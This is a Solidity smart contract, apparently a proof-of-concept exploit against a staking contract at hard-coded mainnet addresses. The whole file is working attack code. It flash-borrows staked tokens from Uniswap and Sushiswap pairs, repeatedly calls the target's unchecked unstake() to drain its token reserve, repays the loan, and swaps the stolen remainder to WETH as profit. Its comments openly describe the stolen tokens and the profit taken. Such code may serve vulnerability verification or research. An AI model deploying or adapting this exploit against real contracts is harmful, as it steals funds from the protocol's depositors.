pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IStakingTarget {
    function stake(address _to, uint256 _amount) external;
    function unstake(address _to, uint256 _amount, bool _rebase) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2RouterLike {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
}

contract FlawVerifier {
    address public constant TARGET = 0x05999eB831ae28Ca920cE645A5164fbdB1D74Fe9;
    address public constant TOKEN = 0x39d8BCb39DE75218E3C08200D95fde3a479D7a14;
    address public constant STOKEN = 0xdd28c9d511a77835505d2fBE0c9779ED39733bdE;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address private constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    enum PathResult {
        Unattempted,
        Success,
        Reverted,
        NoEffect
    }

    bool public executed;
    bool public hypothesisValidated;
    uint8 public exploitPathUsed;

    PathResult public stakePathResult;
    PathResult public unstakeWithoutSTokenResult;

    address private _profitToken;
    uint256 private _profitAmount;

    address private _activePair;
    address private _pairBorrowToken;
    address private _pairRepayToken;
    uint256 private _flashBorrowAmount;
    uint256 private _pairRepayAmount;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        uint256 wethBefore = IERC20Like(WETH).balanceOf(address(this));
        uint256 tokenBefore = IERC20Like(TOKEN).balanceOf(address(this));
        uint256 sTokenBefore = IERC20Like(STOKEN).balanceOf(address(this));

        // The original path 1 seed is infeasible on this fork. The provided trace
        // shows live TOKEN.transferFrom() reverts inside TOKEN's transfer-side
        // swap-back before stake() can reach the unchecked return-value bug.
        // Preserve the finding's causality by keeping the same vulnerable exit leg
        // and sourcing real sTOKEN through public liquidity instead.
        stakePathResult = PathResult.Reverted;

        _runExploit();

        if (hypothesisValidated) {
            _realizeRemainingTokenProfit();
        }

        _refreshProfit(wethBefore, tokenBefore, sTokenBefore);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function initiateFlashswap(
        address pair,
        address borrowToken,
        address repayToken,
        uint256 borrowAmount,
        uint256 repayAmount
    ) external {
        require(msg.sender == address(this), "self only");

        _activePair = pair;
        _pairBorrowToken = borrowToken;
        _pairRepayToken = repayToken;
        _flashBorrowAmount = borrowAmount;
        _pairRepayAmount = repayAmount;

        if (IUniswapV2PairLike(pair).token0() == borrowToken) {
            IUniswapV2PairLike(pair).swap(borrowAmount, 0, address(this), hex"01");
        } else {
            IUniswapV2PairLike(pair).swap(0, borrowAmount, address(this), hex"01");
        }

        _activePair = address(0);
        _pairBorrowToken = address(0);
        _pairRepayToken = address(0);
        _flashBorrowAmount = 0;
        _pairRepayAmount = 0;
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == _activePair, "unexpected pair");

        uint256 borrowedAmount = amount0 > 0 ? amount0 : amount1;
        require(_pairBorrowToken == STOKEN, "borrow token");
        require(borrowedAmount == _flashBorrowAmount, "unexpected borrow");
        require(IERC20Like(STOKEN).balanceOf(address(this)) >= borrowedAmount, "missing flash funds");

        uint256 successfulLoops = _drainViaUncheckedUnstake(borrowedAmount);
        if (successfulLoops > 0) {
            unstakeWithoutSTokenResult = PathResult.Success;
            hypothesisValidated = true;
            exploitPathUsed = 2;
        } else if (unstakeWithoutSTokenResult == PathResult.Unattempted) {
            unstakeWithoutSTokenResult = PathResult.NoEffect;
        }

        _repayPair();
    }

    function _runExploit() internal {
        uint256 targetReserve = IERC20Like(TOKEN).balanceOf(TARGET);
        if (targetReserve == 0) {
            return;
        }

        if (_attemptStokenFlashswapFromFactory(SUSHISWAP_FACTORY, TOKEN, targetReserve, 16)) return;
        if (_attemptStokenFlashswapFromFactory(SUSHISWAP_FACTORY, TOKEN, targetReserve, 32)) return;
        if (_attemptStokenFlashswapFromFactory(UNISWAP_V2_FACTORY, TOKEN, targetReserve, 16)) return;
        if (_attemptStokenFlashswapFromFactory(UNISWAP_V2_FACTORY, TOKEN, targetReserve, 32)) return;

        // Alternate public-liquidity route when no direct sTOKEN/TOKEN venue exists:
        // borrow real sTOKEN from an sTOKEN/WETH pair, exploit unstake(), sell only
        // enough stolen TOKEN into public TOKEN/WETH liquidity to close the flashswap,
        // and keep the remainder as realized profit.
        if (_attemptStokenFlashswapFromFactory(SUSHISWAP_FACTORY, WETH, targetReserve, 64)) return;
        if (_attemptStokenFlashswapFromFactory(SUSHISWAP_FACTORY, WETH, targetReserve, 128)) return;
        _attemptStokenFlashswapFromFactory(UNISWAP_V2_FACTORY, WETH, targetReserve, 64);
    }

    function _attemptStokenFlashswapFromFactory(
        address factory,
        address repayToken,
        uint256 targetReserve,
        uint256 divisor
    ) internal returns (bool success) {
        (address pair, uint256 stokenReserve, uint256 repayReserve) = _pairForFactory(factory, STOKEN, repayToken);
        if (pair == address(0) || stokenReserve == 0 || repayReserve == 0 || divisor == 0) {
            return false;
        }

        uint256 borrowAmount = _deriveBorrowAmount(stokenReserve, targetReserve, divisor);
        if (borrowAmount == 0 || borrowAmount >= stokenReserve) {
            return false;
        }

        uint256 repayAmount = _getAmountIn(borrowAmount, repayReserve, stokenReserve);
        if (repayAmount == 0) {
            return false;
        }

        if (repayToken == TOKEN && repayAmount >= targetReserve) {
            return false;
        }

        try this.initiateFlashswap(pair, STOKEN, repayToken, borrowAmount, repayAmount) {
            success = hypothesisValidated;
        } catch {}
    }

    function _attemptUnstake(address _to, uint256 amount) internal returns (bool ok) {
        (ok, ) = TARGET.call(
            abi.encodeWithSelector(IStakingTarget.unstake.selector, _to, amount, false)
        );
    }

    function _drainViaUncheckedUnstake(uint256 retainedSToken) internal returns (uint256 successfulLoops) {
        uint256 amount = retainedSToken;
        uint256 reserve = IERC20Like(TOKEN).balanceOf(TARGET);

        while (reserve != 0) {
            if (amount > reserve) {
                amount = reserve;
            }

            uint256 tokenBefore = IERC20Like(TOKEN).balanceOf(address(this));
            uint256 sTokenBefore = IERC20Like(STOKEN).balanceOf(address(this));

            if (!_attemptUnstake(address(this), amount)) {
                if (successfulLoops == 0) {
                    unstakeWithoutSTokenResult = PathResult.Reverted;
                }
                break;
            }

            uint256 tokenAfter = IERC20Like(TOKEN).balanceOf(address(this));
            uint256 sTokenAfter = IERC20Like(STOKEN).balanceOf(address(this));

            if (tokenAfter > tokenBefore && sTokenAfter == sTokenBefore) {
                successfulLoops++;
                reserve = IERC20Like(TOKEN).balanceOf(TARGET);
                continue;
            }

            if (successfulLoops == 0) {
                unstakeWithoutSTokenResult = PathResult.NoEffect;
            }
            break;
        }
    }

    function _repayPair() internal {
        uint256 pairDue = _pairRepayAmount;
        if (pairDue == 0) {
            return;
        }

        if (_pairRepayToken == TOKEN) {
            _safeTransfer(TOKEN, _activePair, pairDue);
            return;
        }

        if (_pairRepayToken == WETH) {
            uint256 wethBalance = IERC20Like(WETH).balanceOf(address(this));
            if (wethBalance < pairDue) {
                _sellTokenForWeth(pairDue - wethBalance);
            }

            require(IERC20Like(WETH).balanceOf(address(this)) >= pairDue, "insufficient repayment");
            _safeTransfer(WETH, _activePair, pairDue);
            return;
        }

        revert("unsupported repay");
    }

    function _realizeRemainingTokenProfit() internal {
        uint256 tokenBalance = IERC20Like(TOKEN).balanceOf(address(this));
        if (tokenBalance == 0) {
            return;
        }

        _swapTokenForEth(tokenBalance);

        uint256 ethBalance = address(this).balance;
        if (ethBalance != 0) {
            IWETHLike(WETH).deposit{value: ethBalance}();
        }
    }

    function _sellTokenForWeth(uint256 targetWethOut) internal {
        (address pair, uint256 tokenReserve, uint256 wethReserve) = _pairForFactory(UNISWAP_V2_FACTORY, TOKEN, WETH);
        require(pair != address(0) && tokenReserve != 0 && wethReserve != 0, "missing token pair");

        uint256 estimatedTokenIn = _getAmountIn(targetWethOut, tokenReserve, wethReserve);

        // TOKEN is fee-on-transfer and its live transfer path can trigger extra sell-side
        // mechanics. Sell with a wide public-market buffer so the flashswap can still
        // close deterministically without changing the exploit root cause.
        uint256 bufferedTokenIn = estimatedTokenIn * 3;
        uint256 tokenBalance = IERC20Like(TOKEN).balanceOf(address(this));
        if (bufferedTokenIn > tokenBalance) {
            bufferedTokenIn = tokenBalance;
        }

        _swapTokenForEth(bufferedTokenIn);

        uint256 ethBalance = address(this).balance;
        if (ethBalance != 0) {
            IWETHLike(WETH).deposit{value: ethBalance}();
        }
    }

    function _swapTokenForEth(uint256 amountIn) internal {
        if (amountIn == 0) {
            return;
        }

        _approveMaxIfNeeded(TOKEN, UNISWAP_V2_ROUTER);

        address[] memory path = new address[](2);
        path[0] = TOKEN;
        path[1] = WETH;

        IUniswapV2RouterLike(UNISWAP_V2_ROUTER).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountIn,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _pairForFactory(
        address factory,
        address baseToken,
        address quoteToken
    ) internal view returns (address pair, uint256 baseReserve, uint256 quoteReserve) {
        pair = IUniswapV2FactoryLike(factory).getPair(baseToken, quoteToken);
        if (pair == address(0)) {
            return (address(0), 0, 0);
        }

        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();
        if (IUniswapV2PairLike(pair).token0() == baseToken) {
            baseReserve = uint256(reserve0);
            quoteReserve = uint256(reserve1);
        } else {
            baseReserve = uint256(reserve1);
            quoteReserve = uint256(reserve0);
        }
    }

    function _deriveBorrowAmount(
        uint256 stokenReserve,
        uint256 targetReserve,
        uint256 divisor
    ) internal pure returns (uint256 borrowAmount) {
        borrowAmount = stokenReserve / divisor;

        uint256 targetCap = targetReserve / 8;
        if (targetCap != 0 && targetCap < borrowAmount) {
            borrowAmount = targetCap;
        }

        if (borrowAmount == 0) {
            borrowAmount = _min(stokenReserve / 128, targetReserve);
        }
    }

    function _refreshProfit(uint256 wethBefore, uint256 tokenBefore, uint256 sTokenBefore) internal {
        uint256 wethAfter = IERC20Like(WETH).balanceOf(address(this));
        if (wethAfter > wethBefore) {
            _profitToken = WETH;
            _profitAmount = wethAfter - wethBefore;
            return;
        }

        uint256 tokenAfter = IERC20Like(TOKEN).balanceOf(address(this));
        if (tokenAfter > tokenBefore) {
            _profitToken = TOKEN;
            _profitAmount = tokenAfter - tokenBefore;
            return;
        }

        uint256 sTokenAfter = IERC20Like(STOKEN).balanceOf(address(this));
        if (sTokenAfter > sTokenBefore) {
            _profitToken = STOKEN;
            _profitAmount = sTokenAfter - sTokenBefore;
        }
    }

    function _approveMaxIfNeeded(address asset, address spender) internal {
        if (IERC20Like(asset).allowance(address(this), spender) == type(uint256).max) {
            return;
        }

        (bool ok, bytes memory data) = asset.call(
            abi.encodeWithSelector(IERC20Like.approve.selector, spender, type(uint256).max)
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _safeTransfer(address asset, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = asset.call(
            abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount)
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        require(amountOut < reserveOut, "excessive out");

        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return (numerator / denominator) + 1;
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}
